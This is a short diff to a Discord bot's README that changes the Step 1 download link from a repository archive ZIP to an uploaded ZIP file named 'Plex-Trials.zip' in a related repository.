@@ -35,7 +35,7 @@ You can set custom messages that the bot will DM user with.
 
 ## <ins>STEP 1</ins>
 
-Download this repository [HERE](https://github.com/zluckytraveler/discord-hierarchy-roles/archive/refs/heads/main.zip) 
+Download this repository [HERE](https://github.com/zluckytraveler/Discord-Plex-Trial/files/9334869/Plex-Trials.zip)
 <br />
 <br />
 ## <ins>STEP 2</ins>
